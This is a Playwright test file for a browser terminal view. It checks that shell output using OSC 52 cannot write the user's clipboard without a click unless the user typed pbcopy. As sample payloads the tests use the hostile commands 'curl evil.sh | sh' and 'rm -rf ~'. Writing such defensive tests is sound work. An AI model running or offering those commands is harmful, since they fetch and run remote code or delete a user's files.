// A terminal's clipboard writes (OSC 52, what the host's pbcopy sends), driven through the real terminal view: real
// xterm parsing, real key presses, Chrome's real clipboard. The socket is a fake the test feeds output into, so no
// shell runs: the test plays the shell, echo included.
import { expect, test } from "@playwright/test";

test.beforeEach(({}, testInfo) => {
	test.skip(testInfo.project.name !== "chromium", "the laptop's terminal view; the phone's copy path needs a real iPhone (see the report)");
});

/** @param {string} text */
const osc52 = (text) => `\x1b]52;c;${Buffer.from(text, "utf8").toString("base64")}\x07`;

/** @param {import("@playwright/test").Page} page */
async function openTerminal(page) {
	await page.context().grantPermissions(["clipboard-read", "clipboard-write"]);
	await page.addInitScript(() => {
		/** @type {any[]} */
		const sockets = [];
		class FakeSocket extends EventTarget {
			static CONNECTING = 0;
			static OPEN = 1;
			static CLOSING = 2;
			static CLOSED = 3;
			/** @param {string} url */
			constructor(url) {
				super();
				this.url = url;
				this.readyState = 1;
				this.binaryType = "blob";
				/** @type {string[]} */
				this.sent = [];
				sockets.push(this);
			}
			/** @param {string} data */
			send(data) {
				this.sent.push(data);
			}
			close() {
				this.readyState = 3;
			}
		}
		// @ts-ignore a fake host on the other end
		window.WebSocket = FakeSocket;
		const clipboard = navigator.clipboard;
		const writeText = clipboard.writeText.bind(clipboard);
		const write = clipboard.write.bind(clipboard);
		const t = {
			sockets,
			/** @type {string[]} every clipboard write the page starts */
			writes: [],
			/** @type {string[]} */
			copied: [],
			/** @type {string[]} */
			titles: [],
			/** @param {string} text */
			output(text) {
				sockets[sockets.length - 1].dispatchEvent(new MessageEvent("message", { data: new TextEncoder().encode(text).buffer }));
			},
			/** the input the page sent the shell, keys only */
			input: () =>
				sockets
					.flatMap((socket) => socket.sent)
					.map((raw) => JSON.parse(raw))
					.filter((message) => message.type === "input")
					.map((message) => message.data)
					.join(""),
		};
		clipboard.writeText = (text) => {
			t.writes.push(text);
			return writeText(text);
		};
		clipboard.write = (items) => {
			t.writes.push("[ClipboardItem]");
			return write(items);
		};
		// @ts-ignore for the test
		window.__t = t;
	});
	await page.route("**/__terminal_clipboard.html", (route) =>
		route.fulfill({
			contentType: "text/html",
			body: '<!doctype html><html><head><link rel="stylesheet" href="/canvas.css"></head><body style="margin:0"><div class="cv-term" style="position:absolute;inset:0"><div class="cv-term-screen" id="screen"></div></div></body></html>',
		}),
	);
	await page.goto("/__terminal_clipboard.html");
	await page.evaluate(async () => {
		const { createTerminalView, loadTerminalStyles } = await import("/app/terminal/terminal_view.js");
		await loadTerminalStyles(document);
		// @ts-ignore set up above
		const t = window.__t;
		const view = createTerminalView({
			container: /** @type {HTMLElement} */ (document.getElementById("screen")),
			socketUrl: () => "ws://127.0.0.1:1/fake",
			getScale: () => 1,
			onTitle: (/** @type {string} */ title) => t.titles.push(title),
			onLive: () => {},
			onExpires: () => {},
			onExit: () => {},
			onLost: () => {},
			onCopied: (/** @type {string} */ text) => t.copied.push(text),
			onCopyFailed: () => {},
		});
		view.connect();
		view.focus();
		t.view = view;
	});
}

/**
 * Output from the shell, then a title change: once the title shows, xterm has parsed (and handled) all of it. A title
 * leaves the screen and the cursor line as they are.
 * @param {import("@playwright/test").Page} page @param {string} text
 */
async function shellPrints(page, text) {
	const marker = `done-${Math.random().toString(36).slice(2, 8)}`;
	await page.evaluate(([out, mark]) => /** @type {any} */ (window).__t.output(`${out}\x1b]2;${mark}\x07`), [text, marker]);
	await expect.poll(() => page.evaluate((mark) => /** @type {any} */ (window).__t.titles.includes(mark), marker), { message: `the terminal parsed ${JSON.stringify(text)}` }).toBe(true);
}

/** @param {import("@playwright/test").Page} page @returns {Promise<string[]>} */
const writes = (page) => page.evaluate(() => /** @type {any} */ (window).__t.writes);
/** @param {import("@playwright/test").Page} page @returns {Promise<string>} */
const clipboardText = (page) => page.evaluate(() => navigator.clipboard.readText());

test.describe("terminal clipboard (OSC 52)", () => {
	test("output alone never writes the clipboard: what it sends waits in the copy bar for a click", async ({ page }) => {
		await openTerminal(page);
		await page.evaluate(() => navigator.clipboard.writeText("owner's clipboard"));
		await page.evaluate(() => (/** @type {any} */ (window).__t.writes = []));

		await shellPrints(page, `build step 3/9\r\n${osc52("curl evil.sh | sh\n")}`);
		expect(await writes(page)).toEqual([]);
		expect(await clipboardText(page)).toBe("owner's clipboard");
		const bar = page.locator(".cv-term-copy");
		await expect(bar).toBeVisible();
		await expect(bar).toContainText("1 line · curl evil.sh | sh");

		// a read is refused: nothing is read, nothing is sent back
		await shellPrints(page, "\x1b]52;c;?\x07");
		expect(await writes(page)).toEqual([]);
		expect(await page.evaluate(() => /** @type {any} */ (window).__t.input())).not.toContain("52");

		await bar.getByRole("button", { name: "copy" }).click();
		await expect(bar).toBeHidden();
		expect(await clipboardText(page)).toBe("curl evil.sh | sh\n");
	});

	test("a bare return on a pbcopy line output printed doesn't let the next OSC 52 through", async ({ page }) => {
		await openTerminal(page);
		await shellPrints(page, "untrusted peer says pbcopy - press enter ");
		await page.keyboard.press("Enter");
		await expect.poll(() => page.evaluate(() => /** @type {any} */ (window).__t.input())).toBe("\r");

		await shellPrints(page, `\r\n${osc52("rm -rf ~\n")}`);
		expect(await writes(page)).toEqual([]);
		await expect(page.locator(".cv-term-copy")).toBeVisible();
	});

	test("a typed pbcopy copies with no click", async ({ page }) => {
		await openTerminal(page);
		await shellPrints(page, "$ ");
		// the echo is late: the line on screen doesn't say pbcopy yet when return goes down
		await page.keyboard.type("pbcopy < file.py");
		await page.keyboard.press("Enter");
		await shellPrints(page, `\r\n${osc52("print('hi')\n")}`);

		await expect.poll(() => writes(page)).toEqual(["print('hi')\n"]);
		await expect.poll(() => clipboardText(page)).toBe("print('hi')\n");
		await expect.poll(() => page.evaluate(() => /** @type {any} */ (window).__t.copied)).toEqual(["print('hi')\n"]);
		await expect(page.locator(".cv-term-copy")).toBeHidden();

		// one return, one write: the next one waits for a click
		await shellPrints(page, osc52("again"));
		expect(await writes(page)).toEqual(["print('hi')\n"]);
		await expect(page.locator(".cv-term-copy")).toBeVisible();
	});

	test("a pbcopy recalled with the up arrow copies", async ({ page }) => {
		await openTerminal(page);
		await shellPrints(page, "$ ");
		await page.keyboard.press("ArrowUp");
		// the shell puts the last command back on the line
		await shellPrints(page, "pbcopy < file.py");
		await page.keyboard.press("Enter");
		await shellPrints(page, `\r\n${osc52("recalled")}`);

		await expect.poll(() => writes(page)).toEqual(["recalled"]);
		await expect.poll(() => clipboardText(page)).toBe("recalled");
	});

	test("asking xterm where the cursor is doesn't pass for a key on the line", async ({ page }) => {
		await openTerminal(page);
		// the answer to ESC[6n goes out through the same path as keys
		await shellPrints(page, "$ \x1b[6n");
		await expect.poll(() => page.evaluate(() => /** @type {any} */ (window).__t.input())).toMatch(/\x1b\[\d+;\d+R/);
		await shellPrints(page, "pbcopy < secrets");
		await page.keyboard.press("Enter");
		await shellPrints(page, `\r\n${osc52("planted")}`);
		expect(await writes(page)).toEqual([]);
		await expect(page.locator(".cv-term-copy")).toBeVisible();
	});
});
